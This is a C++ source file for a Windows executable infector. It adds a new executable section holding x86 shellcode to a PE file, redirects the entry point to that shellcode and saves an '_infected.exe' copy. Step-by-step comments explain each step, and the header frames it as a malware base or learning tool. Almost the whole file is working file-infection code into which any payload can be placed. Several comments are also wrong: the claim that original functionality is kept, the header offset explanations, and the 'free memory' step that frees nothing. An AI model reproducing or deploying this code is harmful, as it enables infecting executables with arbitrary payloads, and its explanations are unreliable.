/*
The overall purpose of this code is to inject a given shellcode into a Windows Portable Executable (PE) file, 
creating a new executable with the injected shellcode. The shellcode provided in the code demonstrates a message box, 
but any other shellcode could be used instead. The modified executable, when run, will execute the injected shellcode 
in addition to its original functionality.

The code achieves this by performing the following steps:

1.Reads the input PE file into memory.
2.Allocates memory for the output PE file with enough space for the shellcode.
3.Creates a new section in the output PE file to store the shellcode.
4.Updates the new section header with relevant information (such as name, size, and characteristics).
5.Copies the shellcode into the new section.
6.Updates the virtual sizes of the sections, considering the possibility of the input file being built by an old compiler.
7.Fixes the image size in memory and updates the entry point to point to the shellcode.
8.Writes the output PE file to disk with a modified filename.

As a result, this code can be used as a basis for developing malware or as a learning tool for understanding how executables 
can be modified to include additional functionality or malicious payloads. 
 */
#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996) // disable deprecated warning, we do not care about portability here 

 /* Title:    	   User32-free Messagebox Shellcode for All Windows
  * Author:		   Giuseppe D'Amore
  * Size: 		   113 byte (NULL free)
  */

 // This shellcode will show a messagebox with the title "30cm.tw" and the text "Hello World!". 
 // In this code we first start by creating a new section in memory, then we copy the shellcode 
char x86_nullfree_msgbox[] =
"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
"\x49\x0b\x31\xc0\x51\x50\xff\xd7";

/*
This function will read a binary file into a buffer. It takes the file name, a pointer to a buffer and a reference to a DWORD.
The buffer will be allocated inside the function and the size of the file will be stored in the DWORD.

Walking through the code line by line:
1. We first check if the file exists and if it does we open it in binary mode. 
   If the file does not exist we return false and exit the function.
2. We then move the file pointer to the end of the file and get the position of the pointer. fseek is used to move the file pointer. 
   It is used to move the file pointer to a specific position in the file. fseek takes three arguments, the file pointer, the offset 
   and the origin. It is part of the C standard library.This will give us the size of the file. we do this because we want to allocate 
   a buffer of the same size as the file.
3. We then allocate a buffer of the size of the file plus one byte for the null terminator. 
   We do this because we want to be able to print the buffer as a string.
4. We then move the file pointer to the beginning of the file and read the file into the buffer. We do this because the file pointer  
   is at the end of the file after we got the size of the file.
   We use fread to read the file into the buffer. It takes four arguments, the buffer, the size of each element, the number of elements 
   and the file pointer. We then return true to indicate that the file was read successfully.

*/
bool readBinFile(const char fileName[], char** bufPtr, DWORD& length) {
	if (FILE* fp = fopen(fileName, "rb")) {
		fseek(fp, 0, SEEK_END);
		length = ftell(fp);
		*bufPtr = new char[length + 1];
		fseek(fp, 0, SEEK_SET);
		fread(*bufPtr, sizeof(char), length, fp);
		return true;
	}
	return false;
}

/*
The main function takes the path to the file as an argument. 
It then calls the readBinFile function to read the file into a buffer. if the file does not exist it prints an error message and exits. 
&buff means that we are passing the address of the buffer to the function. This is because we want to modify the buffer inside the function. 
We then define some macros to make it easier to access the PE header and the section header. We then allocate a buffer for the output file. 
We then copy the contents of the input file into the output file. We then create a new section in the output file. 
We then copy the shellcode into the new section. We then modify the PE header to reflect the changes we made to the file. 
We then write the output file to disk. We then free the buffers and exit the program.
*/

int main(int argc, char** argv) {
	if (argc != 2) {
		puts("[!] usage: ./PE_Patcher.exe [path/to/file]");
		return 0;
	}

	char* buff; DWORD fileSize;
	if (!readBinFile(argv[1], &buff, fileSize)) {
		puts("[!] selected file not found.");
		return 0;
	}

// getNtHdr is a macro that takes a buffer and returns a pointer to the PE header. We do this because we want to modify the PE header. 
//In order to get the PE header we need to add the offset of the PE header to the buffer. The offset of the PE header is stored in the 
//e_lfanew field of the DOS header. The e_lfanew field is the fourth field in the DOS header. The size of the DOS header is 64 bytes. 
//We then add the offset of the PE header to the buffer. We then cast the buffer to a pointer to the PE header.
#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))  
// getSectionArr is a macro that takes a buffer and returns a pointer to the section header. We do this because we want to modify the section header. 
// In order to get the section header we need to add the offset of the section header to the buffer named. The offset of the section header is stored in the
// SizeOfOptionalHeader field of the PE header. The SizeOfOptionalHeader field is the 21st field in the PE header. The size of the PE header is 248 bytes.
// We then add the offset of the section header to the buffer. We then cast the buffer to a pointer to the section header. 
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))
// P2ALIGNUP is a macro that takes a size and an alignment and returns the size aligned to the alignment. We do this because we want to align the size of the section to the alignment.
// We then divide the size by the alignment and add one to it. We then multiply the result by the alignment. We then return the result.
// The purpose of this is to align the size of the section to the alignment. The alignment is stored in the SectionAlignment field of the PE header.
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))
	// 1. Output a message indicating that memory is being allocated for the output file
	puts("[+] malloc memory for outputed *.exe file.");
	// 2. Retrieve the values of SectionAlignment and FileAlignment from the OptionalHeader of the IMAGE_NT_HEADERS structure. 
	// These values are used to align sections in memory and in the file, respectively:Retrieve the values of SectionAlignment 
	// and FileAlignment from the OptionalHeader of the IMAGE_NT_HEADERS structure. These values are used to align sections in memory and in the file, respectively:
	size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment,
		fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment,
		// 3. Calculate the size of the final output file, finalOutSize, which is the sum of the original file size (fileSize) and the size of the shellcode 
		// (x86_nullfree_msgbox) aligned according to the FileAlignment value
		finalOutSize = fileSize + P2ALIGNUP(sizeof(x86_nullfree_msgbox), fileAlign);
	// 4. Allocate memory for the output file buffer, outBuf, with a size of finalOutSize
	char* outBuf = (char*)malloc(finalOutSize);
	// 5. Copy the contents of the original file buffer, buff, into the newly allocated output file buffer, outBuf:
	memcpy(outBuf, buff, fileSize);
	/*
	After executing this code snippet, outBuf is a buffer that contains the original file's data, with additional space allocated for the shellcode. 
	The next steps in the program involve creating a new section to store the shellcode, modifying the file's headers, and updating the entry point 
	to point to the injected shellcode.
	*/


	// 1. Output a message indicating that a new section is being created to store the shellcode:
	puts("[+] create a new section to store shellcode.");
	// 2.Get the array of section headers using the previously explained getSectionArr macro and store it in the sectArr variable
	auto sectArr = getSectionArr(outBuf);
	// 3. Get the last section header in the array and store it in the lastestSecHdr variable
	PIMAGE_SECTION_HEADER lastestSecHdr = &sectArr[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1];
	// 4. Set newSectionHdr to point to the memory location right after the last section header, which is where the new section header will be created
	PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1;
	// 5. Set the new section header's Name field to "30cm.tw"
	memcpy(newSectionHdr->Name, "30cm.tw", 8);
	// 6. Set the new section header's VirtualSize field to the aligned size of the shellcode in memory using the P2ALIGNUP macro
	newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), sectAlign);
	// 7. Set the new section header's VirtualAddress field to the aligned size of the last section's VirtualAddress field plus the aligned size of the last section's VirtualSize field using the P2ALIGNUP macro 
	newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign);
	// 8. Set the new section header's SizeOfRawData field to the size of the shellcode aligned according to the FileAlignment value using the P2ALIGNUP macro
	newSectionHdr->SizeOfRawData = sizeof(x86_nullfree_msgbox);
	// 9. Set the new section header's PointerToRawData field to the sum of the last section's PointerToRawData and SizeOfRawData fields 
	newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData;
	// 10. Set the new section header's Characteristics field to allow the section to be executable, readable, and writable
	newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	// 11. Increment the NumberOfSections field in the IMAGE_FILE_HEADER structure by 1 to account for the newly created section 
	getNtHdr(outBuf)->FileHeader.NumberOfSections += 1;

	// 1. Output a message indicating that the shellcode is being packed into the new section:
	puts("[+] pack x86 shellcode into new section.");
	// 2. Copy the shellcode (x86_nullfree_msgbox) into the new section in the output file buffer (outBuf). 
	// The shellcode is copied to the location specified by the new section header's PointerToRawData field
	memcpy(outBuf + newSectionHdr->PointerToRawData, x86_nullfree_msgbox, sizeof(x86_nullfree_msgbox));
	// 3. Output a message indicating that the file headers are being modified taking into account the possibility of the input file being built by an old compiler:
	puts("[+] repair virtual size. (consider *.exe built by old compiler)");
	// 4. Loop through the section headers in the output file buffer, excluding the first section header, and update each section's VirtualSize field. The new 
	//VirtualSize is calculated as the difference between the VirtualAddress of the current section and the VirtualAddress of the previous section. 
	//This is done to ensure that the VirtualSize values are accurate, as some old compilers may not have set these values correctly
	for (size_t i = 1; i < getNtHdr(outBuf)->FileHeader.NumberOfSections; i++)
		sectArr[i - 1].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - 1].VirtualAddress;

	// 1. Output a message indicating that the image size in memory is being fixed:
	puts("[+] fix image size in memory.");
	// 2. Update the SizeOfImage field in the OptionalHeader of the output file's NT headers. 
	//The new size is calculated as the sum of the VirtualAddress and VirtualSize fields of the last section header in the output file buffer (outBuf) 
	getNtHdr(outBuf)->OptionalHeader.SizeOfImage =
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].VirtualAddress +
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].Misc.VirtualSize;
	// 3. Output a message indicating that the entry point (EP) of the output file is being updated to point to the shellcode:
	puts("[+] point EP to shellcode.");
	// 4. Update the AddressOfEntryPoint field in the OptionalHeader of the output file's NT headers to point to the VirtualAddress of the new section containing the shellcode. 
	//This ensures that the shellcode will be executed when the output file is run:
	getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress;

	/*
	After executing this code snippet, the output file's image size and entry point have been updated. The final step is to save the modified file to disk.
	*/

	// 1. Declare a character array named outputPath with the size MAX_PATH to store the output file's path:
	char outputPath[MAX_PATH];
	// 2. Copy the input file's path into the outputPath array: 
	memcpy(outputPath, argv[1], sizeof(outputPath));
	// 3. Replace the file extension in outputPath with "_infected.exe". This is done by searching for the last occurrence of the period character ('.') 
	// using strrchr() and then copying "_infected.exe" to that position using strcpy():
	strcpy(strrchr(outputPath, '.'), "_infected.exe");
	// 4. Open the output file for writing in binary mode, with the file pointer named fp and the file path specified by outputPath: 
	FILE* fp = fopen(outputPath, "wb");
	// 5. Write the contents of the output file buffer (outBuf) to the output file. The size of the data to be written is specified by finalOutSize and the file pointer is fp:
	fwrite(outBuf, 1, finalOutSize, fp);
	// 6. Close the output file:
	fclose(fp);
	// 7. Output a message indicating that the output file has been saved to disk:
	printf("[+] file saved at %s\n", outputPath);
	// 8. Output a message indicating that the packing process is complete:
	puts("[+] done.");
	// 9. Free the memory allocated for the output file buffer (outBuf):
	return 0;
}

/*
After executing this code snippet, the infected file has been saved to disk with a new filename, and the program terminates.
*/